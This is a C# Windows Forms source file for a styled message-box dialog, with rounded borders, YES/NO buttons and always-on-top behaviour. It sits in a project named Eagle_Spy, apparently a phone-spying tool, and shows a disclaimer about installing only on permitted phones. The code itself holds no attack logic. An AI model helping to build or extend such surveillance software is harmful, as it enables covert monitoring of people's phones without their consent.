using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class CraxsMsgbox : Form
{
	public class NativeStructs
	{
		public struct MARGINS
		{
			public int leftWidth;

			public int rightWidth;

			public int topHeight;

			public int bottomHeight;
		}
	}

	public class NativeMethods
	{
		[DllImport("dwmapi")]
		public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref NativeStructs.MARGINS pMarInset);

		[DllImport("dwmapi")]
		internal static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);

		[DllImport("dwmapi.dll")]
		public static extern int DwmIsCompositionEnabled(ref int pfEnabled);
	}

	public class NativeConstants
	{
		public const int CS_DROPSHADOW = 131072;

		public const int WM_NCPAINT = 133;
	}

	private struct FormBoundsColors
	{
		public Color TopLeftColor;

		public Color TopRightColor;

		public Color BottomLeftColor;

		public Color BottomRightColor;
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nobtn")]
	private DrakeUIButtonIcon _nobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("okbtn")]
	private DrakeUIButtonIcon _okbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private bool aeroEnabled;

	private int borderRadius;

	private int borderSize;

	private Color borderColor;

	[field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
;

	internal DrakeUIButtonIcon nobtn
	;

	internal DrakeUIButtonIcon okbtn
	;

	[field: AccessedThroughProperty("msgtext")]
	internal Label msgtext
        ;

    [field: AccessedThroughProperty("titletext")]
	internal DrakeUITitlePanel titletext
        ;

	internal Panel Panel2
	;
	internal Timer Timer1
;

	[field: AccessedThroughProperty("picbox")]
	internal PictureBox picbox
;

	protected override CreateParams CreateParams
	{
		get
		{
			CheckAeroEnabled();
			CreateParams createParams = base.CreateParams;
			if (!aeroEnabled)
			{
				createParams.ClassStyle |= 131072;
				return createParams;
			}
			return createParams;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.okbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.nobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.msgtext = new System.Windows.Forms.Label();
            this.titletext = new DrakeUI.Framework.DrakeUITitlePanel();
            this.picbox = new System.Windows.Forms.PictureBox();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.Panel1.SuspendLayout();
            this.titletext.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picbox)).BeginInit();
            this.Panel2.SuspendLayout();
            this.SuspendLayout();
            // 
            // Panel1
            // 
            this.Panel1.Controls.Add(this.okbtn);
            this.Panel1.Controls.Add(this.nobtn);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel1.Location = new System.Drawing.Point(0, 196);
            this.Panel1.Margin = new System.Windows.Forms.Padding(2);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(322, 32);
            this.Panel1.TabIndex = 0;
            // 
            // okbtn
            // 
            this.okbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.okbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.okbtn.FillColor = System.Drawing.Color.Black;
            this.okbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.okbtn.ForeColor = System.Drawing.Color.Lime;
            this.okbtn.Location = new System.Drawing.Point(246, 4);
            this.okbtn.Margin = new System.Windows.Forms.Padding(2);
            this.okbtn.Name = "okbtn";
            this.okbtn.RectColor = System.Drawing.Color.Lime;
            this.okbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.okbtn.Size = new System.Drawing.Size(65, 23);
            this.okbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.okbtn.TabIndex = 1;
            this.okbtn.Text = "YES";
            this.okbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon2_Click);
            // 
            // nobtn
            // 
            this.nobtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.nobtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.nobtn.FillColor = System.Drawing.Color.Black;
            this.nobtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.nobtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.nobtn.Location = new System.Drawing.Point(115, 4);
            this.nobtn.Margin = new System.Windows.Forms.Padding(2);
            this.nobtn.Name = "nobtn";
            this.nobtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.nobtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.nobtn.Size = new System.Drawing.Size(65, 23);
            this.nobtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.nobtn.Symbol = 61453;
            this.nobtn.TabIndex = 0;
            this.nobtn.Text = "NO";
            this.nobtn.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // msgtext
            // 
            this.msgtext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.msgtext.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.msgtext.Location = new System.Drawing.Point(42, 28);
            this.msgtext.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.msgtext.Name = "msgtext";
            this.msgtext.Size = new System.Drawing.Size(280, 168);
            this.msgtext.TabIndex = 2;
            this.msgtext.Text = "you are the only responsible for using this program\r\nOnly install in phone you ha" +
    "ve permissions to";
            this.msgtext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // titletext
            // 
            this.titletext.Controls.Add(this.msgtext);
            this.titletext.Controls.Add(this.picbox);
            this.titletext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.titletext.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(245)))), ((int)(((byte)(254)))));
            this.titletext.Font = new System.Drawing.Font("Calibri", 12F);
            this.titletext.ForeColor = System.Drawing.Color.White;
            this.titletext.Location = new System.Drawing.Point(0, 0);
            this.titletext.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.titletext.Name = "titletext";
            this.titletext.Padding = new System.Windows.Forms.Padding(0, 28, 0, 0);
            this.titletext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.titletext.Size = new System.Drawing.Size(322, 196);
            this.titletext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.titletext.TabIndex = 3;
            this.titletext.Text = "title";
            this.titletext.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // picbox
            // 
            this.picbox.BackColor = System.Drawing.Color.Black;
            this.picbox.Dock = System.Windows.Forms.DockStyle.Left;
            this.picbox.Location = new System.Drawing.Point(0, 28);
            this.picbox.Margin = new System.Windows.Forms.Padding(2);
            this.picbox.Name = "picbox";
            this.picbox.Size = new System.Drawing.Size(42, 168);
            this.picbox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picbox.TabIndex = 3;
            this.picbox.TabStop = false;
            // 
            // Panel2
            // 
            this.Panel2.Controls.Add(this.titletext);
            this.Panel2.Controls.Add(this.Panel1);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Margin = new System.Windows.Forms.Padding(2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(322, 228);
            this.Panel2.TabIndex = 3;
            this.Panel2.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel2_Paint);
            // 
            // Timer1
            // 
            this.Timer1.Interval = 500;
            this.Timer1.Tick += new System.EventHandler(this.Timer1_Tick);
            // 
            // EagleSpyMsgbox
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(322, 228);
            this.ControlBox = false;
            this.Controls.Add(this.Panel2);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "EagleSpyMsgbox";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Msgbox";
            this.TopMost = true;
            this.Panel1.ResumeLayout(false);
            this.titletext.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picbox)).EndInit();
            this.Panel2.ResumeLayout(false);
            this.ResumeLayout(false);

	}

	protected override void WndProc(ref Message m)
	{
		int msg = m.Msg;
		if (msg == 133)
		{
			int attrValue = 2;
			if (aeroEnabled)
			{
				NativeMethods.DwmSetWindowAttribute(base.Handle, 2, ref attrValue, 4);
				NativeStructs.MARGINS pMarInset = default(NativeStructs.MARGINS);
				pMarInset.bottomHeight = 1;
				pMarInset.leftWidth = 1;
				pMarInset.rightWidth = 1;
				pMarInset.topHeight = 1;
				NativeMethods.DwmExtendFrameIntoClientArea(base.Handle, ref pMarInset);
			}
		}
		base.WndProc(ref m);
	}

	private void CheckAeroEnabled()
	{
		if (Environment.OSVersion.Version.Major >= 6)
		{
			int pfEnabled = 0;
			NativeMethods.DwmIsCompositionEnabled(ref pfEnabled);
			aeroEnabled = pfEnabled == 1;
		}
		else
			aeroEnabled = false;
	}

	public CraxsMsgbox(string t, string m, bool no, Bitmap ico)
	{
		base.Load += CraxsMsgbox_Load;
		base.Paint += CraxsMsgbox_Paint;
		aeroEnabled = true;
		borderRadius = 30;
		borderSize = 3;
		borderColor = Color.Transparent;
		InitializeComponent();
		titletext.Text = t;
		msgtext.Text = m;
		if (!no)
			nobtn.Visible = false;
		picbox.Image = ico;
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.Yes;
		Timer1.Stop();
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.Cancel;
		Timer1.Stop();
		Close();
	}

	private void CraxsMsgbox_Load(object sender, EventArgs e)
	{
		CenterToScreen();
		Timer1.Start();
	}

	private void FormRegionAndBorder(Form form, float radius, Graphics graph, Color borderColor, float borderSize)
	{
		if (base.WindowState == FormWindowState.Minimized)
			return;
		using GraphicsPath path = GetRoundedPath(form.ClientRectangle, radius);
		using Pen pen = new Pen(borderColor, borderSize);
		using Matrix matrix = new Matrix();
		graph.SmoothingMode = SmoothingMode.AntiAlias;
		form.Region = new System.Drawing.Region(path);
		if (borderSize >= 1f)
		{
			Rectangle clientRectangle = form.ClientRectangle;
			float scaleX = 1f - (borderSize + 1f) / (float)clientRectangle.Width;
			float scaleY = 1f - (borderSize + 1f) / (float)clientRectangle.Height;
			matrix.Scale(scaleX, scaleY);
			matrix.Translate(borderSize / 1.6f, borderSize / 1.6f);
			graph.Transform = matrix;
			graph.DrawPath(pen, path);
		}
	}

	private GraphicsPath GetRoundedPath(Rectangle rect, float radius)
	{
		GraphicsPath graphicsPath = new GraphicsPath();
		float num = radius * 2f;
		graphicsPath.StartFigure();
		graphicsPath.AddArc(rect.X, rect.Y, num, num, 180f, 90f);
		graphicsPath.AddArc((float)rect.Right - num, rect.Y, num, num, 270f, 90f);
		graphicsPath.AddArc((float)rect.Right - num, (float)rect.Bottom - num, num, num, 0f, 90f);
		graphicsPath.AddArc(rect.X, (float)rect.Bottom - num, num, num, 90f, 90f);
		graphicsPath.CloseFigure();
		return graphicsPath;
	}

	private void ControlRegionAndBorder(Control control, float radius, Graphics graph, Color borderColor)
	{
		using GraphicsPath path = GetRoundedPath(control.ClientRectangle, radius);
		using Pen pen = new Pen(borderColor, 1f);
		graph.SmoothingMode = SmoothingMode.AntiAlias;
		control.Region = new System.Drawing.Region(path);
		graph.DrawPath(pen, path);
	}

	private void DrawPath(Rectangle rectForm, Graphics graphics, Color color)
	{
		using GraphicsPath path = GetRoundedPath(rectForm, borderRadius);
		using Pen pen = new Pen(color, 3f);
		graphics.DrawPath(pen, path);
	}

	private FormBoundsColors GetFormBoundsColors()
	{
		FormBoundsColors result = default(FormBoundsColors);
		using (Bitmap bitmap = new Bitmap(1, 1))
		{
			using Graphics graphics = Graphics.FromImage(bitmap);
			Rectangle rectangle = new Rectangle(0, 0, 1, 1);
			rectangle.X = checked(base.Bounds.X - 1);
			rectangle.Y = base.Bounds.Y;
			graphics.CopyFromScreen(rectangle.Location, Point.Empty, rectangle.Size);
			result.TopLeftColor = bitmap.GetPixel(0, 0);
			rectangle.X = base.Bounds.Right;
			rectangle.Y = base.Bounds.Y;
			graphics.CopyFromScreen(rectangle.Location, Point.Empty, rectangle.Size);
			result.TopRightColor = bitmap.GetPixel(0, 0);
			rectangle.X = base.Bounds.X;
			rectangle.Y = base.Bounds.Bottom;
			graphics.CopyFromScreen(rectangle.Location, Point.Empty, rectangle.Size);
			result.BottomLeftColor = bitmap.GetPixel(0, 0);
			rectangle.X = base.Bounds.Right;
			rectangle.Y = base.Bounds.Bottom;
			graphics.CopyFromScreen(rectangle.Location, Point.Empty, rectangle.Size);
			result.BottomRightColor = bitmap.GetPixel(0, 0);
		}
		return result;
	}

	private void CraxsMsgbox_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle clientRectangle = base.ClientRectangle;
		checked
		{
			int num = (int)Math.Round((double)clientRectangle.Width / 2.0);
			int num2 = (int)Math.Round((double)clientRectangle.Height / 2.0);
			FormBoundsColors formBoundsColors = GetFormBoundsColors();
			DrawPath(clientRectangle, e.Graphics, formBoundsColors.TopLeftColor);
			Rectangle rectForm = new Rectangle(clientRectangle.Right - num, clientRectangle.Y, num, num2);
			DrawPath(rectForm, e.Graphics, formBoundsColors.TopRightColor);
			Rectangle rectForm2 = new Rectangle(clientRectangle.X, clientRectangle.Bottom - num2, num, num2);
			DrawPath(rectForm2, e.Graphics, formBoundsColors.BottomLeftColor);
			Rectangle rectForm3 = new Rectangle(clientRectangle.Right - num, clientRectangle.Bottom - num2, num, num2);
			DrawPath(rectForm3, e.Graphics, formBoundsColors.BottomRightColor);
			FormRegionAndBorder(this, borderRadius, e.Graphics, borderColor, borderSize);
		}
	}

	private void Panel2_Paint(object sender, PaintEventArgs e)
	{
		ControlRegionAndBorder(Panel2, (float)borderRadius - (float)borderSize / 2f, e.Graphics, borderColor);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		base.TopMost = true;
		BringToFront();
	}
}
